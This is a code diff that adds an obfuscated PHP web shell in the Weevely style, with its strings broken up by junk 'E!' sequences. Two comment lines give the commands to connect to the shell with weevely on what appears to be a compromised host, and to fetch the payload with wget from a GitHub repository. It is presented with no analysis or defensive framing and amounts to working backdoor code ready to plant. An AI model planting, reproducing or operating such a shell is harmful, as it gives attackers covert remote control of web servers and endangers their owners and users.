@@ -1,3 +1,6 @@
+# python weevely.py https://dev.lifelisboa.com/beck.php rijal01
+# wget https://github.com/rijal-cpu/root-server/raw/refs/heads/main/beck.php
+
 <?php
 $v=')E!;parseE!_E!stE!r($u["queE!ryE!"],$q);$E!q=array_values(E!$q);E!E!prE!egE!_E!maE!tch_all("/([\\w])[\\w-E!]+(?:';
 $U='"/_/"E!,"E!/E!-/E!"),array(E!"/","+"),$ss($s[$i],0,$E!E!e))),$k)));$o=obE!_get_cE!oE!nteE!E!nts();ob_end_clea';
